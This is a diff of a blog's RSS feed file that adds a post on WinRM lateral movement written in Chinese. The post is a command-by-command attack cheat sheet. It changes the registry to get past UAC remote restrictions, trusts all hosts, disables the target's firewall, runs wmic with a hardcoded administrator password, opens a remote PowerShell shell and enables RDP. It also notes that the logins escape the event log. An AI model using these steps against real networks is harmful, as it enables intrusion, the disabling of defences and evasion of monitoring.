@@ -8,7 +8,27 @@
     <language>en</language>
     <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
 </copyright>
-    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/authors/dt/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/authors/dt/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>winrm横向</title>
+      <link>/posts/winrm/</link>
+      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/winrm/</guid>
+      <description>横向移动-winrm 条件：500特权用户绕过UAC认证：被攻击的机器是500用户，或者修改注入表，允许所有管理员组的用户winrm连接
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  特点
+**winrm走的是http协议，事件查看器查不到登录信息
+1、本机启动winrm服务
+winrm quickconfig -q  2、信任其他机器
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value &#39;*&#39; WinRM set winrm/config/client @{TrustedHosts=&amp;quot;*&amp;quot;}  3、关闭对面防火墙
+netsh advfirewall set allprofiles state off  4、启动被攻击机5985端口要指定账号密码，且对面是500用户，如果能制作token即可不用指定账号密码
+wmic /node:192.168.13.136 /user:administrator /password:admin@123 process call create &amp;quot;cmd /c winrm quickconfig -q&amp;quot;  注意：wmic不走socks连接。假如与一台机器建立了socks连接，能访问到对方的内网机器，但是不能直接在本机对内网机器进行wmic操作
+5、powershell执行
+Enter-PSSession -ComputerName 192.168.92.136 -Credential administrator  6、输入密码即可进入一个交互式的shell
+cmd开启3389
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  关闭3389</description>
+    </item>
+    
     <item>
       <title>内网PTH</title>
       <link>/posts/pth/</link>
